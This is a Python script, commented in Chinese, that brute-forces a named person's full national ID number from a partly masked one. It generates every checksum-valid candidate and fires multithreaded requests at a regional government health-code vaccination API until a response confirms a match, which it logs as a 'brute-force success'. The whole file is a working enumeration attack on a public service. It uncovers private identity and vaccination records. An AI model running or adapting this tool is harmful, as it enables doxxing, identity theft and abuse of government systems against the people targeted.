import os
import string
import itertools
import requests
import threading

k=input("姓名")
b=input("请输入身份证，未知用‘*’表示")
print("开始运行，已经过滤掉不符合实际的身份证")
print("范围：1950-2022")

def check_id_length(n):
    if len(str(n)) != 18:
        #print("只支持18位身份证号查询")
        return False
    else:
        return True
def check_id_data(n):
        if int(n[6:10])>2022 or int(n[6:10])<1950:#年
            return False
        
        if int(n[10:12])>12:#月份
            return False
        
        if int(n[12:14])>31:#日期
            return False
            
        var=[7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2]
        var_id=['1','0','X','9','8','7','6','5','4','3','2']
        n = str(n)
        sum = 0
        if int(n[16])%2==0:
            gender="女"
            same=int(int(n[16])/2)
        else:
            gender="男"
            same=int((int(n[16])+1)/2)
        for i in range(0,17):
            sum += int(n[i])*var[i]
        sum %= 11
        if (var_id[sum])==str(n[17]):
            #print("身份证号规则核验通过，校验码是：",var_id[sum])
            #print("出生于：",n[6:10],"年",n[10:12],"月",n[12:14],"日","性别：",gender,"\n当地同性别同生日排名：",same)
            return True
        else:
            #print("出生于：",n[6:10],"年",n[10:12],"月",n[12:14],"日","性别：",gender,"\n当地同性别同生日排名：",same)
            #print("但身份证号规则核验失败，校验码应为",var_id[sum],"，当前校验码是：",n[17])
            return False

a1 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a2 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a3 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a4 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a5 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a6 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a7 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a8 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a9 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a10 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a11 = ["0", "1"]
a12 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a13 = ["0", "1", "2", "3"]
a14 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a15 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a16 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a17 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
a18 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "X"]

if b[0:1]!="*":
    a1=[b[0:1]]
if b[1:2]!="*":
    a2=[b[1:2]]
if b[2:3]!="*":
    a3=[b[2:3]]
if b[3:4]!="*":
    a4=[b[3:4]]
if b[4:5]!="*":
    a5=[b[4:5]]
if b[5:6]!="*":
    a6=[b[5:6]]
if b[6:7]!="*":
    a7=[b[6:7]]
if b[7:8]!="*":
    a8=[b[7:8]]
if b[8:9]!="*":
    a9=[b[8:9]]
if b[9:10]!="*":
    a10=[b[9:10]]
if b[10:11]!="*":
    a11=[b[10:11]]
if b[11:12]!="*":
    a12=[b[11:12]]
if b[12:13]!="*":
    a13=[b[12:13]]
if b[13:14]!="*":
    a14=[b[13:14]]
if b[14:15]!="*":
    a15=[b[14:15]]
if b[15:16]!="*":
    a16=[b[15:16]]
if b[16:17]!="*":#检测男女
    if int(b[16:17])%2==0:
        print("检测性别 女")
    else:
        print("检测性别 男")
    a17=[b[16:17]]
if b[17:18]!="*":
    a18=[b[17:18]]

if b[16:17]=="*":#输入男女
    m=input("请输入性别‘男’或‘女’或者‘未知’")
    if m=="男":
        a17=["1","3","5","7","9"]
    elif m=="女":
        a17=["0","2","4","6","8"]
with open(r'过滤后.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
f = open("过滤后.txt", "a")
for result in itertools.product(a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14,a15,a16,a17,a18):
    x="".join(result)
    #print(x)
    if check_id_length(x) and check_id_data(x):
        f.write(x+'\n')
        #print(x)

f.close()

#开始分割
with open(r'过滤后_part0.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
with open(r'过滤后_part1.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
with open(r'过滤后_part2.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
with open(r'过滤后_part3.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
with open(r'过滤后_part4.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
with open(r'过滤后_part5.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
with open(r'过滤后_part6.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
with open(r'过滤后_part7.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
with open(r'过滤后_part8.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
with open(r'过滤后_part9.txt','a+',encoding='utf-8') as test:
    test.truncate(0)
with open(r'过滤后_part10.txt','a+',encoding='utf-8') as test:
    test.truncate(0)


sourceFileName = "过滤后.txt" #定义要分割的文件
def cutFile():
    print("正在读取文件...")
    sourceFileData = open(sourceFileName,'r',encoding='utf-8')
    ListOfLine = sourceFileData.read().splitlines()#将读取的文件内容按行分割，然后存到一个列表中
    n = len(ListOfLine)
    print("文件共有"+str(n)+"行")
    m = 10 #定义分割的文件个数
    p = n//m + 1
    print("需要将文件分成"+str(m)+"个子文件")
    print("每个文件最多有"+str(p)+"行")
    print("开始进行分割···")
    for i in range(m):
        print("正在生成第"+str(i+1)+"个子文件")
        destFileName = os.path.splitext(sourceFileName)[0]+"_part"+str(i)+".txt" #定义分割后新生成的文件
        destFileData = open(destFileName,"w",encoding='utf-8')
        if(i==m-1):
            for line in ListOfLine[i*p:]:
                destFileData.write(line+'\n')
        else:
            for line in ListOfLine[i*p:(i+1)*p]:
                destFileData.write(line+'\n')
        destFileData.close()
    print("分割完成")
 
cutFile()

#开始多线程
with open(r'匹配的身份证.txt','a+',encoding='utf-8') as test:
    test.truncate(0)

def panduan(q):
    datas = { 'name':k,'cardNo':q,'ehealthCardId':'309B2836C93384E23624B43B53D3090E8BC4526F9B246D7B4E6A3AF14FDF3380'}
    r = requests.post("https://jkt.jzswjw.gov.cn/AREAServer/epidemicNew/getXgYmInfo", data=datas).json()
    #print(r)
    if len(str(r))>100:
        return True
    else:
        return False

def thread1():
    
    for line in open("过滤后_part0.txt"):
        line = line[:-1]
        y=line
        if panduan(y):
            print("爆破成功："+k+"——"+y)
            f=open("匹配的身份证.txt","a")
            f.write("爆破成功："+k+"——"+y+'\n')
            f.close()
        else:
            print("不匹配"+y)
    
def thread2():
    
    for line in open("过滤后_part1.txt"):
        line = line[:-1]
        y=line
        if panduan(y):
            print("爆破成功："+k+"——"+y)
            f=open("匹配的身份证.txt","a")
            f.write("爆破成功："+k+"——"+y+'\n')
            f.close()
        else:
            print("不匹配"+y)
       
def thread3():
    
    for line in open("过滤后_part2.txt"):
        line = line[:-1]
        y=line
        if panduan(y):
            print("爆破成功："+k+"——"+y)
            f=open("匹配的身份证.txt","a")
            f.write("爆破成功："+k+"——"+y+'\n')
            f.close()
        else:
            print("不匹配"+y)

def thread4():
    
    for line in open("过滤后_part3.txt"):
        line = line[:-1]
        y=line
        if panduan(y):
            print("爆破成功："+k+"——"+y)
            f=open("匹配的身份证.txt","a")
            f.write("爆破成功："+k+"——"+y+'\n')
            f.close()
        else:
            print("不匹配"+y)
    
def thread5():
    
    for line in open("过滤后_part4.txt"):
        line = line[:-1]
        y=line
        if panduan(y):
            print("爆破成功："+k+"——"+y)
            f=open("匹配的身份证.txt","a")
            f.write("爆破成功："+k+"——"+y+'\n')
            f.close()
        else:
            print("不匹配"+y)

def thread6():
    
    for line in open("过滤后_part5.txt"):
        line = line[:-1]
        y=line
        if panduan(y):
            print("爆破成功："+k+"——"+y)
            f=open("匹配的身份证.txt","a")
            f.write("爆破成功："+k+"——"+y+'\n')
            f.close()
        else:
            print("不匹配"+y)

def thread7():
    
    for line in open("过滤后_part6.txt"):
        line = line[:-1]
        y=line
        if panduan(y):
            print("爆破成功："+k+"——"+y)
            f=open("匹配的身份证.txt","a")
            f.write("爆破成功："+k+"——"+y+'\n')
            f.close()
        else:
            print("不匹配"+y)

def thread8():
    
    for line in open("过滤后_part7.txt"):
        line = line[:-1]
        y=line
        if panduan(y):
            print("爆破成功："+k+"——"+y)
            f=open("匹配的身份证.txt","a")
            f.write("爆破成功："+k+"——"+y+'\n')
            f.close()
        else:
            print("不匹配"+y)

def thread9():
    
    for line in open("过滤后_part8.txt"):
        line = line[:-1]
        y=line
        if panduan(y):
            print("爆破成功："+k+"——"+y)
            f=open("匹配的身份证.txt","a")
            f.write("爆破成功："+k+"——"+y+'\n')
            f.close()
        else:
            print("不匹配"+y)

def thread10():
    
    for line in open("过滤后_part9.txt"):
        line = line[:-1]
        y=line
        if panduan(y):
            print("爆破成功："+k+"——"+y)
            f=open("匹配的身份证.txt","a")
            f.write("爆破成功："+k+"——"+y+'\n')
            f.close()
        else:
            print("不匹配"+y)



if __name__ == "__main__":
    t1 = threading.Thread(target=thread1) 
    t2 = threading.Thread(target=thread2) 
    t3 = threading.Thread(target=thread3)
    t4 = threading.Thread(target=thread4)
    t5 = threading.Thread(target=thread5)
    t6 = threading.Thread(target=thread6)
    t7 = threading.Thread(target=thread7)
    t8 = threading.Thread(target=thread8)
    t9 = threading.Thread(target=thread9)
    t10 = threading.Thread(target=thread10)
    
    t1.start()  
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()
    t10.start()
    
    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
    t6.join()
    t7.join()
    t8.join()
    t9.join()
    t10.join()

o=input("运行完成，按回车键退出")
